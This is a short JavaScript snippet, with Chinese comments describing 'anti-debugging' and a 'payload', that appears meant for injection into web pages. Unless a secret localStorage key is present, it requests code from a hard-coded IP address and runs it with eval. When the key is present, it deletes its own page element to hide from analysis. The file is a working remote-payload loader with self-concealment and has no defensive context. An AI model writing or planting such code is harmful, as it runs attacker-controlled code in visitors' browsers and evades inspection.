
/*************************

动态加载及删除实现反调试

debug key : 48kqFArmn6fIizVO
node id : lxraa

**************************/
if(localStorage.getItem("48kqFArmn6fIizVO")==null){
	var p_url = "https://216.189.150.136:5556/X5lKvJQHFb/";
	var a = new XMLHttpRequest();				//动态获取payload
	a.onreadystatechange = function() {
		if (a.readyState == 4 && a.status == 200) {
			eval(a.responseText)
		}
	};
	a.open("GET", p_url);
	a.send();
}
else{
	var e = window.document.getElementById("lxraa");				//清理node
	e.parentNode.removeChild(e);
}
